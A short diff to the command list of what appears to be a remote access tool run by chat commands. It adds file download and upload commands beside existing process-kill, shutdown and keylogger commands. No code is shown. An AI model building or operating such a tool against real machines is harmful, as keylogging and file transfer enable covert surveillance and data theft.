@@ -131,6 +131,8 @@ System Access:
 !processkill <pid>     : Kill a process by PID
 !shutdown              : Shutdown the system
 !restart               : Restart the system
+!download <filename>   : Download file 
+!upload                : Upload file
 !keylog                : Start Keylogger (NEW!)
 !stoplog               : Stop Keylogger  (NEW!)
 
